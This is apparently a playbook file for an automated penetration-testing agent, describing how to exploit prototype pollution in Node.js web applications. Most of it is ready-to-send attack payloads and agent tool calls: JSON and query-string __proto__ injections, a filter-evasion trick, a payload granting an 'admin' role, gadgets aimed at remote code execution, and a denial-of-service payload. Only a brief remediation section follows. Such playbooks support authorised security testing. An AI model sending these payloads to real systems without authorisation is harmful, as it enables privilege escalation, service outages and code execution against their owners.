# Prototype pollution (Node)

A recursive merge / clone / `set` of attacker JSON into an object can write
`Object.prototype`, poisoning every object in the process — DoS, auth/logic
bypass, sometimes RCE via a downstream gadget. Hit any endpoint that merges
request bodies (settings/config update, `_.merge`, deep `Object.assign`, query
parsers).

1. **Pollute** — send `__proto__` (or `constructor.prototype`) in a JSON body:

       http_request(url:".../api/profile", method:"POST",
         headers:{"Content-Type":"application/json"},
         body:'{"__proto__":{"polluted":"yes"}}')

   Nested target: `{"x":{"__proto__":{"polluted":"yes"}}}`. Query-string
   form — nest UNDER an existing object-shaped param the app already parses (a
   `sort`/`filter`/`options` field found via `browser_get_form_fields`/
   `http_history`), not a bare top-level key — this is what actually reaches the
   vulnerable merge: `?filter[__proto__][polluted]=yes` or
   `?sort[constructor][prototype][polluted]=yes`. **Bypass a literal-string
   filter** on `__proto__`: unicode-escape it in the JSON key (`JSON.parse`
   normalizes it back, a raw-body grep filter misses it) —
   `{"__proto__":{"polluted":"yes"}}` — or wrap one level in
   an array the merge code iterates: `{"a":[{"__proto__":{"polluted":"yes"}}]}`.
2. **Confirm reflection** — pollute on endpoint A, then read the effect on an
   UNRELATED endpoint B (never the same route you polluted — an echo there
   proves nothing). Pollute `{"__proto__":{"role":"admin"}}`, then `GET` your
   profile on a DIFFERENT route; `role:admin` you never set ⇒ real
   `Object.prototype` corruption.
3. **Property gadgets** — libs read prototype props: pollute
   `{"__proto__":{"status":500}}`, `{"__proto__":{"json spaces":10}}` (Express
   re-indents subsequent JSON responses — a visible, side-effect-free proof), or
   a template/`shell`/`NODE_OPTIONS` option (escalates to RCE). Watch
   status/length/formatting deltas after polluting.
4. **DoS probe** — `{"__proto__":{"toString":0}}` often 500s every later request
   (only on a target you may disrupt).

Evidence: a clean request reflecting the polluted property (or the JSON-spaces
re-indent) AFTER the pollution request.
Remediation: `Object.create(null)` maps; block `__proto__` / `constructor` /
`prototype` keys; `Object.freeze(Object.prototype)`; schema-validate (ajv) and
avoid unsafe recursive merge.

Escalate a confirmed pollution straight to RCE via the EJS `outputFunctionName`
gadget in `40-ssti.md` if the stack renders EJS.
